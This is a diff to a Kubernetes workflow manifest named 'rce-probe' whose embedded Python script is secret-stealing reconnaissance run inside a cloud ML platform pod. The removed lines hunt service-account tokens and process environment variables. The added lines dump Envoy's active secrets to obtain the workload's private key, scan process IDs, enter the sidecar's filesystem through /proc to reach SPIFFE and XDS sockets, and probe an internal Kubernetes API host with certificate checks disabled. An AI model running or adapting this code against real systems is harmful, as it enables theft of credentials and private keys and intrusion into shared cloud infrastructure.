@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.9.0"
+    ai.sap.com/version: "4.10.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "jwt-token-hunt-secrets-sds-proc"
+    executables.ai.sap.com/description: "svid-privkey-pid-ns-xds-socket-probe"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,17 +28,18 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, struct, subprocess, glob
+            import os, socket, struct, subprocess, glob, re
 
-            print('[PROBE_V49_START]', flush=True)
+            print('[PROBE_V410_START]', flush=True)
 
-            # ── Emit helper ───────────────────────────────────────────────────────
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
-                print(f'[{label}] {flat}', flush=True)
+                # Strip potential private key material truncation by chunking
+                for i in range(0, max(1, len(flat)), 3000):
+                    chunk = flat[i:i+3000]
+                    print(f'[{label}_{i}] {chunk}', flush=True)
 
-            # ── Envoy admin H2C bypass ────────────────────────────────────────────
-            def envoy_admin(path, timeout=20):
+            def envoy_admin(path, timeout=25):
                 s = socket.socket(); s.settimeout(timeout)
                 s.connect(('127.0.0.1', 15000))
                 req = (
@@ -58,131 +59,126 @@ spec:
                 s.close()
                 return b''.join(chunks).decode(errors='replace')
 
-            # ── 1. Kubernetes SA token paths ──────────────────────────────────────
-            print('[TOKEN_HUNT_START]', flush=True)
-            token_paths = [
-                '/var/run/secrets/kubernetes.io/serviceaccount/token',
-                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
-                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-                '/var/run/secrets/tokens/istio-token',
-                '/var/run/secrets/tokens/kube-apiserver-token',
-                '/run/secrets/kubernetes.io/serviceaccount/token',
-                '/secrets/token',
-            ]
-            for p in token_paths:
-                try:
-                    with open(p, 'rb') as f:
-                        data = f.read()
-                    emit(f'TOKEN_FILE_{p.replace(\"/\",\"_\")}', data[:2000].decode(errors='replace'))
-                except Exception as e:
-                    emit(f'TOKEN_MISS_{p.replace(\"/\",\"_\")}', str(e))
-
-            # ── 2. Glob all secret mounts ─────────────────────────────────────────
-            for pat in ['/var/run/secrets/**', '/run/secrets/**', '/secrets/**']:
-                try:
-                    found = glob.glob(pat, recursive=True)
-                    emit(f'GLOB_{pat}', found)
-                except Exception as e:
-                    emit(f'GLOB_ERR', str(e))
-
-            # ── 3. /proc/1/environ ────────────────────────────────────────────────
+            # ── 1. Full Envoy dynamic_active_secrets ────────────────────────────
+            # This is the SVID cert+key if Envoy doesn't redact
+            print('[SECRETS_DUMP_START]', flush=True)
             try:
-                with open('/proc/1/environ', 'rb') as f:
-                    env = f.read().replace(b'\x00', b'|')
-                emit('PROC1_ENVIRON', env.decode(errors='replace'))
+                sec = envoy_admin('/config_dump?resource=dynamic_active_secrets', timeout=25)
+                emit('SECRETS_FULL', sec)
             except Exception as e:
-                emit('PROC1_ENVIRON_ERR', str(e))
+                emit('SECRETS_FULL_ERR', str(e))
 
-            # ── 4. /proc/self/environ ─────────────────────────────────────────────
+            # ── 2. /proc/self/status (caps, uid, gid) ───────────────────────────
             try:
-                with open('/proc/self/environ', 'rb') as f:
-                    env = f.read().replace(b'\x00', b'|')
-                emit('SELF_ENVIRON', env.decode(errors='replace'))
+                with open('/proc/self/status') as f:
+                    emit('SELF_STATUS', f.read())
             except Exception as e:
-                emit('SELF_ENVIRON_ERR', str(e))
+                emit('SELF_STATUS_ERR', str(e))
 
-            # ── 5. /proc/mounts ───────────────────────────────────────────────────
+            # ── 3. Check if PID namespace shared — list /proc/*/cmdline ─────────
+            print('[PID_SCAN_START]', flush=True)
+            pids_found = []
             try:
-                with open('/proc/mounts', 'r') as f:
-                    emit('PROC_MOUNTS', f.read())
+                for pid_dir in sorted(os.listdir('/proc')):
+                    if not pid_dir.isdigit(): continue
+                    try:
+                        with open(f'/proc/{pid_dir}/cmdline', 'rb') as f:
+                            cmd = f.read().replace(b'\x00', b' ').decode(errors='replace').strip()
+                        pids_found.append(f'{pid_dir}:{cmd[:80]}')
+                    except:
+                        pass
+                emit('ALL_PIDS', pids_found)
+            except Exception as e:
+                emit('PID_SCAN_ERR', str(e))
+
+            # ── 4. Try to access istio-proxy root via /proc/<pid>/root ──────────
+            # Find pids of pilot-agent or envoy
+            istio_pids = []
+            for entry in pids_found:
+                pid_str, cmd = entry.split(':', 1)
+                if any(k in cmd for k in ['pilot-agent', 'envoy', 'istio', 'proxy']):
+                    istio_pids.append((pid_str, cmd))
+            emit('ISTIO_PIDS', istio_pids)
+
+            for pid, cmd in istio_pids[:3]:
+                for uds_path in [
+                    '/etc/istio/proxy/XDS',
+                    '/var/run/secrets/workload-spiffe-uds/socket',
+                ]:
+                    proc_path = f'/proc/{pid}/root{uds_path}'
+                    exists = os.path.exists(proc_path)
+                    emit(f'PROC_{pid}_ROOT_{uds_path.replace(\"/\",\"_\")}', exists)
+                    if exists:
+                        try:
+                            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                            s.settimeout(5)
+                            s.connect(proc_path)
+                            # Send a SPIFFE workload API request (gRPC)
+                            # FetchX509SVIDs request
+                            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+                            resp = s.recv(4096)
+                            s.close()
+                            emit(f'UDS_CONN_{pid}_{uds_path.replace(\"/\",\"_\")}', resp[:500].hex())
+                        except Exception as e:
+                            emit(f'UDS_ERR_{pid}_{uds_path.replace(\"/\",\"_\")}', str(e))
+
+            # ── 5. Full /proc/mounts ─────────────────────────────────────────────
+            try:
+                with open('/proc/mounts') as f:
+                    emit('PROC_MOUNTS_FULL', f.read())
             except Exception as e:
                 emit('PROC_MOUNTS_ERR', str(e))
 
-            # ── 6. Envoy admin /secrets (SDS secret names) ───────────────────────
-            try:
-                sec = envoy_admin('/secrets')
-                # Just the first 8000 chars to avoid truncation
-                emit('ENVOY_SECRETS', sec[:8000])
-            except Exception as e:
-                emit('ENVOY_SECRETS_ERR', str(e))
-
-            # ── 7. pilot-agent port 15020 endpoints ──────────────────────────────
-            for ep in ['/', '/healthz/ready', '/debug/config_dump', '/debug/ndsz',
-                       '/quitquitquit', '/app-health/kserve-container/readyz']:
+            # ── 6. Try connecting to XDS socket directly (abstract) ──────────────
+            # Try both path forms in case the socket is accessible
+            for sock_path in [
+                '/etc/istio/proxy/XDS',
+                '/var/run/secrets/workload-spiffe-uds/socket',
+                '\x00etc/istio/proxy/XDS',
+            ]:
                 try:
-                    s = socket.socket(); s.settimeout(8)
-                    s.connect(('127.0.0.1', 15020))
-                    req = f'GET {ep} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
-                    s.sendall(req.encode())
+                    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                    s.settimeout(4)
+                    s.connect(sock_path)
+                    resp = s.recv(1024)
+                    s.close()
+                    emit(f'DIRECT_UDS_{sock_path[:30].replace(\"/\",\"_\")}', resp[:200].hex())
+                except Exception as e:
+                    emit(f'DIRECT_UDS_ERR_{sock_path[:30].replace(\"/\",\"_\")}', str(e)[:80])
+
+            # ── 7. Check /proc/self/net/unix vs /proc/net/unix to confirm ───────
+            try:
+                with open('/proc/self/net/unix') as f:
+                    emit('SELF_NET_UNIX', f.read())
+            except Exception as e:
+                emit('SELF_NET_UNIX_ERR', str(e))
+
+            # ── 8. K8s API server reachability + anonymous endpoints ────────────
+            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com')
+            k8s_port = int(os.environ.get('KUBERNETES_SERVICE_PORT', '443'))
+            import ssl
+            for path in ['/version', '/api/v1/namespaces', '/openid/v1/jwks', '/.well-known/openid-configuration']:
+                try:
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    s = socket.socket()
+                    s.settimeout(8)
+                    ss = ctx.wrap_socket(s, server_hostname=k8s_host)
+                    ss.connect((k8s_host, k8s_port))
+                    req = f'GET {path} HTTP/1.0\r\nHost: {k8s_host}\r\n\r\n'
+                    ss.sendall(req.encode())
                     resp = b''
                     while True:
-                        c = s.recv(65536)
+                        c = ss.recv(65536)
                         if not c: break
                         resp += c
-                    s.close()
-                    emit(f'PORT15020_{ep.replace(\"/\",\"_\")}', resp[:3000].decode(errors='replace'))
+                    ss.close()
+                    emit(f'K8S_API_{path.replace(\"/\",\"_\")}', resp[:800].decode(errors='replace'))
                 except Exception as e:
-                    emit(f'PORT15020_ERR_{ep.replace(\"/\",\"_\")}', str(e))
+                    emit(f'K8S_API_ERR_{path.replace(\"/\",\"_\")}', str(e))
 
-            # ── 8. /proc/net/unix (accessible sockets) ───────────────────────────
-            try:
-                with open('/proc/net/unix', 'r') as f:
-                    emit('PROC_NET_UNIX', f.read())
-            except Exception as e:
-                emit('PROC_NET_UNIX_ERR', str(e))
-
-            # ── 9. XDS workload socket ────────────────────────────────────────────
-            xds_sockets = [
-                '/var/run/secrets/workload-spiffe-uds/socket',
-                '/var/run/secrets/grpc-xds/xds-grpc',
-                '/tmp/grpc-xds.sock',
-                '/var/run/grpc/grpc-xds.sock',
-            ]
-            for sp in xds_sockets:
-                exists = os.path.exists(sp)
-                emit(f'XDS_SOCK_{sp.replace(\"/\",\"_\")}', exists)
-
-            # ── 10. Try istiod:15010 with our SA token if found ──────────────────
-            token_val = None
-            try:
-                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
-                    token_val = f.read().strip()
-                emit('SA_TOKEN_FOUND', f'len={len(token_val)} prefix={token_val[:50]}')
-            except:
-                emit('SA_TOKEN_NOT_MOUNTED', 'skipping istiod auth attempt')
-
-            # ── 11. /proc/1/fd symlinks (check for token file descriptors) ───────
-            try:
-                fds = os.listdir('/proc/1/fd')
-                fd_links = []
-                for fd in fds[:50]:
-                    try:
-                        link = os.readlink(f'/proc/1/fd/{fd}')
-                        fd_links.append(f'{fd}→{link}')
-                    except:
-                        pass
-                emit('PROC1_FDS', fd_links)
-            except Exception as e:
-                emit('PROC1_FDS_ERR', str(e))
-
-            # ── 12. Envoy /config_dump?resource=dynamic_active_secrets ────────────
-            try:
-                sec2 = envoy_admin('/config_dump?resource=dynamic_active_secrets')
-                emit('CFGDUMP_SECRETS', sec2[:8000])
-            except Exception as e:
-                emit('CFGDUMP_SECRETS_ERR', str(e))
-
-            print('[PROBE_V49_DONE]', flush=True)
+            print('[PROBE_V410_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
